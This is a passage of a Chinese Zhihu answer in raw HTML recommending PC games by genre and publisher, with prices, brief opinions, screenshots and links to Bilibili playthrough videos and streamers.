工作室</strong>的地铁离乡，正在游戏中，虽然是第一次接触，还是很喜欢这种剧情写得好，环境渲染好的 FPS 射击类游戏。</p>\n<p>前作 2033 和最后的曙光都很便宜，可以全入。</p>\n<figure><img src=\"https://pic4.zhimg.com/v2-48ea93b29da3982b84d53f942486966d_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>7 days to die 26 元</strong></p>\n<p>和 CSGO 同年代的老游戏，僵尸，想必大家“库里”都有，也推荐一下</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-ac204a2c7b84a190b4e424d7d2141dba_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>逃生 2 22 元</strong></p>\n<p>神作。胆小慎入。</p>\n<figure><img src=\"https://pic4.zhimg.com/v2-21f19ee79eec80f5d3ffcc3647eaede5_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>恐怖黎明 15 元</strong></p>\n<p>喜欢暗黑破坏神的玩家可以入。</p>\n<figure><img src=\"https://pic4.zhimg.com/v2-862f17e00c81ef23ed31ac05c9779f76_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>Prototype 国区被 BAN</strong></p>\n<p>说到求生僵尸题材，这是一款当年口碑和热度能和 GTA 相提并论的游戏，可惜后来工作室凉了。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-d070e8a384c41fd39108b87c374e4931_720w.jpg?source=8673f162\" alt=\"\"></figure><p>我觉得这是所有游戏人物中技能最帅最酷的角色。国区被 BAN 大概要出个专区了，还有</p>\n<p><strong>黎明杀\"鸡\" 27 元</strong></p>\n<p>喜欢第五人格的可以入手，大家公平对称博弈玩腻了，可以玩会大名鼎鼎 4V1 的非对称游戏，玩玩\"原作\"。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-1876ff95f0d3746d50d78639c67b8b61_720w.jpg?source=8673f162\" alt=\"\"></figure><p><a href=\"http://link.zhihu.com/?target=https%3A//www.bilibili.com/video/BV1Mx411W7ND%3Ffrom%3Dsearch%26seid%3D17902940469888097525\" target=\"_blank\" rel=\"nofollow noreferrer\">【KJ 解说】本体全剧情支线流程攻略（全 43P）</a></p>\n<p><a href=\"http://link.zhihu.com/?target=https%3A//www.bilibili.com/video/BV1Nb411m7Uc\" target=\"_blank\" rel=\"nofollow noreferrer\">【完结】老戴《地铁离去【逃离】【离乡】+ 全 DLC</a></p>\n<p><a href=\"https://www.zhihu.com/question/35296900/answer/ht%3Ci%3Etps%3C/i%3E://www.bilibili.com/video/BV19x411U7zX?from=search&amp;seid=17902940469888097525\">【C 菌】窒息般恐惧!【逃生 2】中英双语实况连载</a> 终于到 C 君了！！！</p>\n<p><a href=\"http://link.zhihu.com/?target=https%3A//www.bilibili.com/video/BV1Gs411x7EK%3Ffrom%3Dsearch%26seid%3D17902940469888097525\" target=\"_blank\" rel=\"nofollow noreferrer\">虐杀原形 1Hard+ 难度花式通关（已完结）</a></p>\n<p><strong>14. 剧情丰富</strong></p>\n<p><strong>神界原罪 2 66 元 拉瑞安工作室</strong></p>\n<p>一款看起来像国产广告的游戏，真香，真的是神作了，剧情相当丰富，玩进去了大概需要 200h+ 才能体验到这十年的巅峰 RPG 是什么样的。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-37620c9108f2682e5bab0657d925e3f8_720w.jpg?source=8673f162\" alt=\"\"></figure><p>另一款是同一个老哥推荐的，打 MOD 可玩性很高。（最近免费了）</p>\n<figure><img src=\"https://pic4.zhimg.com/v2-758930806397a9c944bb39e87edbb812_720w.jpg?source=8673f162\" alt=\"\"></figure><p>还有几款剧情神作，这里也顺便推荐了</p>\n<p><strong>瘟疫传说无罪 59 元</strong></p>\n<p>19 年 steam 剧情丰富大奖，流程并不算长，但是很值得一玩，冲题材也不错。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-c166c40099873a5b6d1dfdcb236e5cd8_720w.jpg?source=8673f162\" alt=\"\"></figure><p>还有策略游戏 <strong>瘟疫公司进化 19 元，</strong>玩了 100h+，然后卡关了。。</p>\n<p><strong>2020 贴合现实的游戏，望大家做好防护工作，注意安全！</strong></p>\n<p><strong>死亡搁浅 预计 200 元左右</strong>（游戏评价两极分化警告</p>\n<p>送快递？如果你觉得没游戏玩了，可以看看小岛秀夫是不是“也”跌落神坛了，本作并不算必买，仅限有钱没处花的玩家。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-ff7d66162b984b2b3603e65b4c30fd3e_720w.jpg?source=8673f162\" alt=\"\"></figure><p>6 月 19 号更新</p>\n<p><strong>底特律：变人</strong></p>\n<p><strong>昨天刚刚登录 steam，心目中和西部世界一样的神作，话说西部世界 3 也出了。</strong></p>\n<figure><img src=\"https://pic1.zhimg.com/v2-962b3c71c3e52cb9ef1321caefe439bb_720w.jpg?source=8673f162\" alt=\"\"></figure><p><a href=\"https://www.zhihu.com/question/35296900/answer/http%3Ci%3Es://w%3C/i%3Eww.bilibili.com/video/BV1Yx411s7t3?from=search&amp;seid=17902940469888097525\">（星云）年度 RPG 大作 -（神界原罪 2）战术难度</a> 星云也播骑砍 2</p>\n<p><a href=\"http://link.zhihu.com/?target=https%3A//www.bilibili.com/video/BV1K4411J7wF\" target=\"_blank\" rel=\"nofollow noreferrer\">【散人】2019 黑马！汹涌鼠群 姐弟求生《瘟疫传说:无罪》（完结共 13P）</a> 终于到散人了！！</p>\n<p><a href=\"https://www.zhihu.com/question/35296900/answer/http%3Ci%3Es://www%3C/i%3E.bilibili.com/video/BV164411E7L9?from=search&amp;seid=17902940469888097525\">【60 帧】【完结】 老戴《瘟疫传说 无罪》全收集剧</a></p>\n<p><a href=\"http://link.zhihu.com/?target=https%3A//www.bilibili.com/video/BV1EE411q7Vp\" target=\"_blank\" rel=\"nofollow noreferrer\">【完结】老戴《死亡搁浅》剧情向精剪全流程解说</a></p>\n<p><strong>15. EA 推荐橘子购买&amp;EA Access</strong></p>\n<figure><img src=\"https://pic1.zhimg.com/v2-16b87c37f9a481ed3ade5bdf93e9fb6d_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic4.zhimg.com/v2-50e34fa7c783d90156aabe83a415ebbb_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>战地系列 战地 1&amp;5 </strong></p>\n<p>太有名了，我玩的也确实不多，但也大致玩了 200h+，喜欢 fps 可以入手，关联 cod 系列也可以入。</p>\n<p>可能会有新玩家问 234 呢，234 相对不那么新，玩过 1 和 5 可以补票。</p>\n<figure><img src=\"https://pic4.zhimg.com/v2-74fdb47bd8429dc0438eec2678b6a741_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic3.zhimg.com/v2-29c25930fce1630432767af7139a04d1_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>APEX</strong></p>\n<p>一款看起来会超过 ow 的游戏（ow 金框路过....钻石划水 已经不怎么玩了），可惜无论是 apex 还是 ow 都缺口气，下一个就看瓦罗兰火不火了</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-08348dd6f30bd761cf495a64dcc3ad85_720w.jpg?source=8673f162\" alt=\"\"></figure><p>阿这，童年的回忆（暴露年龄</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-65a2a27f4a93933cf57515c5ef64a7fb_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>星球大战 绝地 200 元左右</strong></p>\n<p><strong>星战粉必入</strong>，如果不是很感冒可以把其他推荐的都感受一遍后，想试试新花样可以入，我也不懂国内喜欢星战的人是多是少，反正十五年前我们一起看星球大战的时候，属实被震惊了。。如果看电影，一定好好一口气看完 9 部，绝对是西方推崇宿命论的巅峰之作，期待星战的下一部游戏。</p>\n<p>6 月 19 号更新 下一部是星球大战 中卫</p>\n<p>所以是 前线 中卫 后浪？</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-99ed5042160869ec46d12689f4b3e3a7_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>EA Sports FIFA&amp;NFL</strong></p>\n<p>喜欢体育的应该都会玩，能不能出个棒球系列...One outs 真好看</p>\n<figure><img src=\"https://pic4.zhimg.com/v2-ba45cd370c6e771780628a3d94ba111e_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-bca4abef6d85feb7e44041ce557fe38e_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>泰坦陨落 2 </strong></p>\n<p>越是 EA 不重视得游戏，越值得买，这应该是我最推荐购买的 EA 游戏了。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-4e520f24bfbf53fa88295a91d1b9e3d8_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>孤岛危机 3 </strong></p>\n<p>当年的显卡杀手，画质顶尖，现在玩起来仍不落伍。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-af8ab961edd864123b5b2108828bdc65_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>极品飞车系列</strong></p>\n<p>竞速游戏我不是很在行，留给其他答主科普</p>\n<figure><img src=\"https://pic4.zhimg.com/v2-af18f19b67ddd5f626afbafc0a531f8c_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>质量效应系列和龙腾世纪系列 Bioware 工作室</strong></p>\n<p><strong>TGA14 年年度游戏</strong></p>\n<figure><img src=\"https://pic1.zhimg.com/v2-f3654d05f41a14e2ea29d60df4853559_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-1f75b5c4774d0b4092979fde69446102_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>模拟人生 3&amp;4 </strong></p>\n<p>真 模拟人生，4 也有不过不在 steam 上。（19 号更新，已经上了）</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-1b4fd9a33be05b24d29ab8728cc92ba6_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic2.zhimg.com/v2-2df471f0570f5937890a77ca01541ae7_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>镜之边缘系列</strong></p>\n<p>这几天看 pva 玩，还可以，新作催化剂很不错，跑酷界大佬，消光 2gkd 求求了！</p>\n<figure><img src=\"https://pic4.zhimg.com/v2-a5ecc5153482abb121e81ac4b5099a4d_720w.jpg?source=8673f162\" alt=\"\"></figure><p>EA 还有一款早期游戏叫<strong>孢子</strong>，是初中同学推荐玩的，还不错，不过似乎知乎基本上木有人推荐，这里就不放图了</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-5f58df237cefc3d5d6fc1502e4d1c419_720w.jpg?source=8673f162\" alt=\"\"></figure><p><a href=\"http://link.zhihu.com/?target=https%3A//www.bilibili.com/video/BV1ZJ411W7mq\" target=\"_blank\" rel=\"nofollow noreferrer\">【60 帧】老戴《星球大战 绝地 陨落的武士团》</a></p>\n<p><strong>16.模拟(养生)大类 欧洲卡车模拟 2 &amp; 城市天际线 200 元左右</strong></p>\n<p><strong>Satisfactory 80 元</strong></p>\n<p><strong>6 月 19 日更新，原本 epic 独占，3d 版异星工场</strong></p>\n<figure><img src=\"https://pic2.zhimg.com/v2-52a60da333daeeea838b63726b4fdeec_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>硬核养老游戏</strong></p>\n<figure><img src=\"https://pic4.zhimg.com/v2-7901dd2a8ed81c4c3a7a67545bda4ab6_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-3be14996f58b19a5022d4ce7d5650a2f_720w.jpg?source=8673f162\" alt=\"\"></figure><p>这两款是 3000+h 的基友安利的，无奈我造房子彩笔，倒车倒到脑溢血，明明已经倒车倒到脑溢血了，还入手美国卡车模拟继续逛风景。</p>\n<p>购买建议：找贴吧看，我是基本上全 DLC 入手，趁打折一个游戏大概 200 多块</p>\n<p>还有动物园之星，由过山车之星开发者制作</p>\n<p><strong>Planet Zoo 全 DLC200 元左右</strong></p>\n<p>属于新游戏，喜欢模拟类的可以入，动物相当萌，不急的可以==</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-fa937db87846760239a4da0c7d599124_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>Farming Simulator 19 epic 似乎免费领过(不是 epic 请来的，只是顺口一提</strong></p>\n<p>种田、养老（还可以开车，相当不错了</p>\n<figure><img src=\"https://pic4.zhimg.com/v2-4fad51d8ca9d70c5ecbe6a5a48c71f4e_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>狂热运输 2 100 元</strong></p>\n<p>本作就跟名字一样，属于对交通模拟规划感兴趣的玩家一定可以入手的游戏，交通模拟类型，当然城市天际线也有交通 dlc 可以入，卡车模拟更是，对交通“运营”感兴趣的可以入，</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-1761cda54c584f2c59781ef46288568b_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>推荐主播：</strong></p>\n<p><strong>养老游戏真的真的没有你们想的那么养老！！历经 30 个小时锤炼，我终于学会了在美卡和欧卡怎么开卡车...这个真学不来，建议自行练习。</strong></p>\n<p><strong>17. ubi 大家族</strong></p>\n<p><strong>R6 200 元 +（把他当作 OW 类型，入土豪版建议时长 1000h+，好友玩 R6 分两种，一种是玩了几小时就再也没打开过，一种就是无脑 1000h+）</strong></p>\n<figure><img src=\"https://pic1.zhimg.com/v2-05baf77c8ff8c636a2027d87266defb2_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>看门狗 2 79 元</strong></p>\n<p><strong>体验下旧金山的风景和黑客风格。</strong></p>\n<figure><img src=\"https://pic2.zhimg.com/v2-3c7f560227f0733be52a038b5ff1aa1d_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>远哭 5 79 元</strong></p>\n<figure><img src=\"https://pic1.zhimg.com/v2-b49c27f455f73d5b392f1186ce248534_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>远哭：新曙光 75 元</strong></p>\n<figure><img src=\"https://pic1.zhimg.com/v2-64a3a764bd915deee3fd0a5170e3a4f0_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>全境封锁 2 21 元(epic，最近应该要上 steam，这里放个 1，其实也很不错了)</strong></p>\n<figure><img src=\"https://pic2.zhimg.com/v2-372d86333cdc447adf68693075096e01_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>刺客信条全系列（1、2、兄弟会、启示录、3 重制、解放、叛变、黑旗、大革命、枭雄、编年史） 除了起源、奥德赛外前作原价买估计 1000+，</strong></p>\n<p><strong><em>然而 ubi 只有限时原价还会经常免费送</em>，打折时候买大概加起来应该在两百块左右</strong></p>\n<p><strong>18. V 社大家族</strong></p>\n<p><strong>CSGO 不开箱免费，开箱 1W 起步</strong></p>\n<p><strong>我带你们打，A1 高闪秋梨膏。</strong></p>\n<figure><img src=\"https://pic1.zhimg.com/v2-bd226b2a6e5f7a382fed64a435059558_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>Half-Life: Alyx 新作 127 元</strong></p>\n<p><strong>没有半条命，就没有 V 社；</strong></p>\n<p><strong>没有 V 社，就没有 stEAm；</strong></p>\n<p><strong>没有 stEAm，你们也不会看到这个问题。</strong></p>\n<figure><img src=\"https://pic1.zhimg.com/v2-2d3e9519c4e9e2196c06b669178d99b9_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>传送门 2 Portal 2 3 元</strong></p>\n<p><strong>2020 年，我还在推荐 2010 年的游戏。</strong></p>\n<figure><img src=\"https://pic3.zhimg.com/v2-8769271e0758f332cafac85a344cc84b_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>求生之路 2 3 元</strong></p>\n<p><strong>2015 年的时候这款游戏我通过我邮箱找回 steam 账户时候发现在我的账号里，神作。</strong></p>\n<figure><img src=\"https://pic2.zhimg.com/v2-46ac98f486c2f5ec2d6adc60c88803ad_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>Dota2</strong></p>\n<p><strong>只能说当年拳头确实借鉴了 dota 一些思路，但不妨碍两款都是上个时代最优秀的游戏</strong></p>\n<p><strong>dota2 出了老玩家都说不好玩，时间久了还不是真香。</strong></p>\n<figure><img src=\"https://pic4.zhimg.com/v2-f9baceebff0b6956534aef8c726f1de4_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>好友的 Dota 大佬全变成自走棋大佬，自走棋这个创意真的是相当牛逼了，连带暴雪和拳头两个巨头也学习出了自走棋</strong></p>\n<p>PS 不过我也很难喜欢炉石自走棋，刚出的时候上了快 9000 分，勉强摸到国服排行榜，不过现在都是万分神仙打架了</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-eacfa7820b3d8d65c117f10ba0fb8531_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>16. 大众肝帝免费游戏(DLC 花钱)</strong></p>\n<p><strong>军团要塞 2 V 社免费游戏</strong></p>\n<figure><img src=\"https://pic2.zhimg.com/v2-e2194ec98867c9f23e12fef9bfb0c8b5_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>命运 2 免费游戏</strong></p>\n<figure><img src=\"https://pic4.zhimg.com/v2-41efb524825215b8c971479ffd23e3f7_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>星际战甲 免费游戏</strong></p>\n<figure><img src=\"https://pic1.zhimg.com/v2-fa7aaec52e444511535ace85cfa844fb_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>战争雷霆 (很肝！！！) DLC 花钱</strong></p>\n<figure><img src=\"https://pic4.zhimg.com/v2-1b6de415a4d412dfe4a9a3e4ebaf9adf_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>19. 其他游戏</strong></p>\n<p>其实 steam 也是一个很好的软件 or 桌面管理工具，以下平台我也放在 steam 平台当作 steam 看待了(滑稽</p>\n<figure><img src=\"https://pic4.zhimg.com/v2-166f532c182d2025480a64f6444ebb6a_720w.jpg?source=8673f162\" alt=\"\"></figure><p>有的是留学和交换期间用的 local 的游戏平台，有些需要科学上网，这些平台也有很多不错的游戏，<strong>建议大家搞个 UU 或者奇游或者雷神加速器，其他有好的加速效果都行，每个月就十来块钱，游戏体验还是蛮好的。</strong></p>\n<p>游戏萌新还望大佬们嘴下留情。下面是精品篇。</p>\n<p>再加一个<strong>Temtem</strong></p>\n<p><strong>喜欢宝可梦类的玩家，PokemonGo 手游玩家必入</strong>，教教@game freak 怎么做游戏，太香了。</p>\n<figure><img src=\"https://pic4.zhimg.com/v2-f35de198a7e9cae716107b4d595d0ad5_720w.jpg?source=8673f162\" alt=\"\"></figure><p>20. <strong>国产 3A 大作</strong></p>\n<p>不管《悟空》登陆哪个平台，一定要冲！</p>\n<p>中国不缺玩家，也不缺优秀的人才，凭什么做不出一款优质的游戏艺术品大作？</p>\n<p>我知道很多玩家后悔很晚才看到这个问题下的优质回答，因为在某些游戏中花了过多的金钱和时间，付出和回馈的不成正比；很多时候一两个皮肤或者装备的钱就够你买上几个轻松有观赏艺术或者有游戏性的游戏玩很久。</p>\n<p>真心希望少一些诱惑人一直氪金的“黑心厂商”，多多培养一些有一定审美素养的游戏公司和玩家。</p>\n<p>怕的不是没有资金和人才，怕的是整个行业坐在摇钱树上不思进取，虽然我们的游戏互联网产业已经取得了巨大的成就，但还是应该在不足的领域继续开疆扩土。</p>\n<p>我相信以《悟空》为首的这一批游戏大获成功后，以后国产 3A 会下饺子一样在 steam 销量榜上名列前茅。</p>\n<p><a href=\"http://link.zhihu.com/?target=https%3A//www.bilibili.com/video/BV1x54y1e7zf\" target=\"_blank\" rel=\"nofollow noreferrer\"><span>https://www.</span><span>bilibili.com/video/BV1x</span><span>54y1e7zf</span><span></span></a></p>\n<p>（PS. 不是广告，无意中打开小黑盒的一个实机演示的视频，国产游戏的演示我其实期待程度并不是很高，细心的朋友可能会发现我推荐的游戏没有一款国产，但是看完这款演示游戏我马上就推荐给了朋友，事后证明这款游戏已经登顶了知乎热搜榜第一 7000 万热度，第二名才不过 2000 万</p>\n<hr>\n<p><strong>精品篇（首发价大约在百元内级别或者风格属于独立游戏范畴或者肉鸽类</strong></p>\n<p><strong>很多时候玩游戏很快乐，但是没准看别人玩更欢乐</strong></p>\n<p><strong>下面的游戏属于各大主播挖掘出来的好游戏，攻略可以看 看游侠、3dm 这些，当然很多游戏都是通过以下几人购买游玩，买之前最好 k 看看自己能不能接受这种类型 ：</strong></p>\n<p><a href=\"http://link.zhihu.com/?target=https%3A//space.bilibili.com/546195\" target=\"_blank\" rel=\"nofollow noreferrer\">老番茄</a></p>\n<p><a href=\"http://link.zhihu.com/?target=https%3A//space.bilibili.com/433351%3Ffrom%3Dsearch%26seid%3D4048118945493837967\" target=\"_blank\" rel=\"nofollow noreferrer\">EdmundDZhang</a></p>\n<p><a href=\"http://link.zhihu.com/?target=https%3A//space.bilibili.com/168598%3Ffrom%3Dsearch%26seid%3D4048118945493837967\" target=\"_blank\" rel=\"nofollow noreferrer\">逍遥散人</a></p>\n<p><a href=\"http://link.zhihu.com/?target=https%3A//space.bilibili.com/122879%3Ffrom%3Dsearch%26seid%3D4048118945493837967\" target=\"_blank\" rel=\"nofollow noreferrer\">敖厂长</a></p>\n<p><a href=\"http://link.zhihu.com/?target=https%3A//space.bilibili.com/14110780%3Ffrom%3Dsearch%26seid%3D4048118945493837967\" target=\"_blank\" rel=\"nofollow noreferrer\">凉风 Kaze</a></p>\n<p><a href=\"http://link.zhihu.com/?target=https%3A//space.bilibili.com/4162287%3Ffrom%3Dsearch%26seid%3D4048118945493837967\" target=\"_blank\" rel=\"nofollow noreferrer\">渗透之 C 君</a></p>\n<p><a href=\"http://link.zhihu.com/?target=https%3A//space.bilibili.com/423895%3Ffrom%3Dsearch%26seid%3D4048118945493837967\" target=\"_blank\" rel=\"nofollow noreferrer\">怕上火暴王老菊</a></p>\n<p><a href=\"http://link.zhihu.com/?target=https%3A//space.bilibili.com/1577804%3Ffrom%3Dsearch%26seid%3D4992294640247999844\" target=\"_blank\" rel=\"nofollow noreferrer\">某幻君</a></p>\n<p><a href=\"http://link.zhihu.com/?target=https%3A//space.bilibili.com/562197%3Ffrom%3Dsearch%26seid%3D4945597223329121750\" target=\"_blank\" rel=\"nofollow noreferrer\">中国 BOY 超级大猩猩</a></p>\n<p><a href=\"http://link.zhihu.com/?target=https%3A//space.bilibili.com/43536/\" target=\"_blank\" rel=\"nofollow noreferrer\">黑桐谷歌</a></p>\n<p><a href=\"http://link.zhihu.com/?target=https%3A//space.bilibili.com/295711424/\" target=\"_blank\" rel=\"nofollow noreferrer\">神秘店长 A</a></p>\n<p>（最早玩 B 站是因为古典音乐和 acg 乐器演奏，没想到莫名其妙关注了这么多游戏主播、动漫评测、美食主播和电影鉴赏主播，以及各类专注于科普知识和讲历史的 up，有时间另做分享）</p>\n<p><strong>1.冒险解谜类（好评如潮警告！类魂警告！</strong></p>\n<p><strong>人类一败涂地 19 元 </strong></p>\n<p>这是沙雕游戏，不是游戏沙雕，是玩家玩着玩着就很欢乐</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-77583690753d7afaf83f8ccab69957fc_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>奥日：黑暗森林&amp;萤火意志 17 元 /90 元（微软</strong></p>\n<p>画风、bgm、玩法好评，新作刚刚发售，相当不错，男女通玩，老少皆宜（此类游戏玩多了就当练手指了，然而 10 年小提琴玩家表示这游戏练手指简直弱爆了，钢琴爱好者应该也有同感</p>\n<p>虽然我通关花了接近 20h。。。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-ccdcb85fa03933dd2d296961c77bf09c_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>空洞骑士 24 元</strong></p>\n<p>类魂，强烈建议大家多玩玩魂，把该练的练好了，什么游戏都不在话下，最高难度就完事了</p>\n<figure><img src=\"https://pic4.zhimg.com/v2-856b0ac6cf7e3a8bfe1da2b6b8004306_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>蔚蓝 23 元</strong></p>\n<p>像素冒险类，tql，当年拿奖拿到手软，b 站很多知名游戏 UP 都做过视频。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-52b394ac72858c75b0ebccd9d77ba5bc_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>雨中冒险 2 56 元</strong></p>\n<p>rogue 类多人 3D，画风惊艳，十分炫酷，玩的时候控制好时间，时间长容易晕</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-b160c17bc21cdbfac8173287e702c324_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>死亡细胞 53 元</strong></p>\n<p>也是拿奖拿到手软，rogue+ 银河战士恶魔城类型，简称 RogueVania，神作</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-f75fcd52cb04a1505931075611a1a314_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>以撒的结合：重生 16 元</strong></p>\n<p>冒险解谜像素神作，roguelike 神作</p>\n<figure><img src=\"https://pic4.zhimg.com/v2-ceeadf2c3005796069baa2a461c0f660_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>Hades 64 元</strong></p>\n<p>这款属于肉鸽玩家补充玩耍，我是很喜欢希腊神话和肉鸽类所以就入手了，似乎人气还不错</p>\n<p>动作 rogue 游戏，刚登录 steam，之前在 epic 独占一年，冥王哈迪斯的傻儿子历险记，rogue，人物打击手感不错，缺点是==吧，一些关卡还没做完，应该算处于 EA 阶段，这几天又大更了一次（准确说是月月更</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-85519e668aa830b789b7da7cdbd210e8_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>巫婆 Noita 46 元</strong></p>\n<p>动作 rogue 新游戏，EA 阶段，制作人都是独立游戏制作人大佬，这是一款开放性相当不错，想象力相当不错的 roguelike，后期有点难，喜欢 rogue 的可以入手</p>\n<figure><img src=\"https://pic4.zhimg.com/v2-bdaff648decca5f42aca3af105a6a0d2_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>三位一体 1234 大包 100 元左右</strong></p>\n<p>3 评价一般，其他三部好评如潮</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-ae4ae67e23719c8784017b547078f5b7_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>一说到三位一体就想到咆哮魔变节奴隶主亵渎</strong></p>\n<p><strong>2. 游戏风格新颖</strong></p>\n<p><strong>Baba is you 35 元</strong></p>\n<p>文字图像解谜类，非常有想象力的游戏，faker 直播玩过，觉得算神作。（制作人后来去做 Noita 了</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-605698a99e84e6f935988851a447ac99_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>疑案追声 22 元 DLC 黑面观音一定要买</strong></p>\n<p>我觉得这已经不算支不支持国产了，这是游戏模式的创新，我大概推荐了十几个好友都入手了这款，神作（国产</p>\n<p>PS 那个配音偏西普的是<strong>茄子</strong></p>\n<figure><img src=\"https://pic4.zhimg.com/v2-8648b74f50ac356cdbbae7b41b28d3f2_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>燥热 superhot 31 元 VR 另买也是 40 元左右</strong></p>\n<p>子弹时间，玩法很好玩，每一帧都很帅，连起来就是大电影</p>\n<p>顺便安利一款手游叫<strong>time locker</strong>，我在 appstore 和 googleplay 都入了全人物，真的很好玩，不过似乎玩的人也不是很多 qaq</p>\n<figure><img src=\"https://pic4.zhimg.com/v2-03e02b2609b3de875e6c2293c37a17a7_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>我的朋友佩德罗 49 元</strong></p>\n<p><strong>steam2019 最具创意游戏玩法大奖</strong></p>\n<figure><img src=\"https://pic1.zhimg.com/v2-8ee7b40ec89e8efd643e84296805e49c_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>武士：零 33 元</strong></p>\n<p>像素级别的动作时间游戏，游戏性跟 superhot 很像</p>\n<figure><img src=\"https://pic4.zhimg.com/v2-d0e6c666bff28c5161723f597894ace4_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>3.</strong><strong>生存&amp;建造&amp;模拟 3D 类（可生存，可建造，也可模拟，一定要有朋友一起！！！！！ </strong></p>\n<p><strong>这一类是相当经典，虽然有些可能不是大家熟知的 3A 钱多的带制作，但是从口碑和可玩性上是媲美 3A 的优质作品，所以这里单独列一类。上述的方舟：进化属于生存建造模拟类，而求生之路 2、Dayz、消逝的光芒、地铁离乡、猎杀对决、七日杀则都更偏属于生存末日(跑酷？)类。</strong></p>\n<p><strong>The Forest 森林 35 元</strong></p>\n<p><strong>剧情简洁不拖沓，当作饥荒类纯生存也可以，找儿子什么的剧情都不存在的！最高 8 人联机！8 人房走起，另：当初玩的时候有老哥加进我们好友房，1 托 n 带着我们玩游戏体验极佳。</strong></p>\n<figure><img src=\"https://pic1.zhimg.com/v2-4212406756f46d8a5327d3250a088705_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>Rust 28 元</strong></p>\n<p><strong>怎么说，对萌新不太友好，但游戏确实是好游戏，有大佬带可以入手。</strong></p>\n<figure><img src=\"https://pic2.zhimg.com/v2-cc1d3ed87270027b0abadecf86b203e6_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>Raft 木筏 47 元</strong></p>\n<p><strong>如果你在森林晚上害怕野人(怕啥晚上叫上兄弟一起输出当猎人，那么木筏就是非常舒服的一款游戏，就像哈尔的移动城堡一样，建造属于你自己的移动城堡~</strong></p>\n<figure><img src=\"https://pic3.zhimg.com/v2-6cc959527ed841af96a2d273badcacd1_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>无人深空 63 元</strong></p>\n<p><strong>一款一直在变得更好的游戏，起初他不够好，现在他已经变得很好，未来还会更好。</strong></p>\n<figure><img src=\"https://pic1.zhimg.com/v2-10fd46a1e48bc71aabc59153a2117185_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>ASTRONEER 异星探险家 58 